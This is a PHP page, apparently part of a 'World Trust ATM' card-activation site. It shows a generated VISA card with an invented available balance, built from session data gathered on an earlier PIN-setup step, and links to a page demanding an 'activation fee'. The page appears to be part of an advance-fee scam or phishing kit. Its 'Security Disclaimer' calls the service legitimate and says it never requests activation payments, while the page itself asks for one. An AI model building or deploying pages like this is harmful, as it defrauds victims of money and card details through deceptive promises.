<?php
/**
 * World Trust ATM - Card Activation
 * Page 3: Card Display
 */

require_once 'includes/config.php';
require_once 'includes/functions.php';

// Check if user data and card data exist in session
check_user_session();
check_session_timeout();

// Check if card details exist in session (from pin-setup.php)
if (!isset($_SESSION['card_number']) || !isset($_SESSION['cvv']) || !isset($_SESSION['expiry'])) {
    header('Location: pin-setup.php');
    exit();
}

// Get card data from session
$card_number = $_SESSION['card_number'];
$cvv = $_SESSION['cvv'];
$expiry = $_SESSION['expiry'];
$balance = $_SESSION['balance'] ?? DEFAULT_BALANCE;

$user_name = get_full_name();
$card_number_masked = format_card_number_masked($card_number);
$card_number_display = format_card_number_full($card_number);
$balance_formatted = format_currency($balance);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?> - Your Card</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <!-- Card Display Container -->
        <div class="card-display-container" id="cardContainer">
            <div class="success-icon">✓</div>
            <h2 class="success-message">Your card is ready for activation!</h2>
            
            <!-- ATM Card -->
            <div class="atm-card">
                <div class="card-logo">VISA</div>
                <div class="card-chip"></div>
                <div class="card-number"><?php echo $card_number_masked; ?></div>
                <div class="card-details">
                    <div class="card-holder">
                        <div class="card-label">Card Holder</div>
                        <div class="card-value"><?php echo strtoupper($user_name); ?></div>
                    </div>
                    <div class="card-expiry">
                        <div class="card-label">Expires</div>
                        <div class="card-value"><?php echo $expiry; ?></div>
                    </div>
                </div>
            </div>
            
            <!-- Balance Display -->
            <div class="balance-display">
                <div class="balance-label">Available Balance</div>
                <div class="balance-amount"><?php echo $balance_formatted; ?></div>
            </div>
            
            <p style="margin-bottom: 20px; color: var(--text-light);">
                Your card details have been configured. Click below to proceed with the activation fee payment.
            </p>
            
            <a href="payment.php" style="text-decoration: none;">
                <button class="btn btn-primary">Activate Card</button>
            </a>
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Disclaimer</div>
            <p>This is a legitimate card activation service. We will never ask for your PIN, full card number via email/text, or request payment to activate your card. Always verify you're on the correct website URL (https://[yoursite.com]) before entering any information.  If you receive suspicious emails or calls claiming to be from us, do not provide any personal information and contact our security team immediately at [security phone/email]. Your data is protected with bank-level encryption and will never be sold to third parties. </p>
        </div>
    </div>
</body>
</html>
